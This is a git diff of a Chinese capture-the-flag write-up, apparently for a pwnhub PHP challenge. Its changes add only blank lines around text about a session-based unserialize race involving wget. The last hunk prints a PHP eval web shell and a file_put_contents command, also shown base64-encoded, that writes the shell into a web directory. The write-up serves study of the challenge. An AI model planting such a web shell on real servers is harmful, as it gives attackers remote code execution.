@@ -140,6 +140,7 @@ if (isset($_POST['image'])) {
 1、访问的时候会生成独有的sessionid，并执行`set_context($sessId);`，获取firesun文件内容。
 
 2、在第一次请求结束后，pwnhubfile会执行生成firesun
+
 ```
 function pwnhubfile()
 {
@@ -149,6 +150,7 @@ function pwnhubfile()
 
 register_shutdown_function('pwnhubfile');
 ```
+
 但最重要的问题wget是不能覆盖文件的，如果wget相同文件名的，会出现firesun.1。
 
 也就是说第一次请求结束还没能反序列化成功，就代表这里失败了。
@@ -238,7 +240,9 @@ for i in range(0,10000):
 ```
 <?php eval($_POST[2]);?
 
+
 file_put_contents("/var/www/html/2d9bc625acb1ba5d0db6f8d0c8b9d206/image/ddoge.php", base64_decode("PD9waHAgZXZhbCgkX1BPU1RbMl0pOz8+"));
+
 
 ZmlsZV9wdXRfY29udGVudHMoIi92YXIvd3d3L2h0bWwvMmQ5YmM2MjVhY2IxYmE1ZDBkYjZmOGQwYzhiOWQyMDYvaW1hZ2UvZGRvZ2UucGhwIiwgYmFzZTY0X2RlY29kZSgiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTWwwcE96OCsiKSk7
 ```
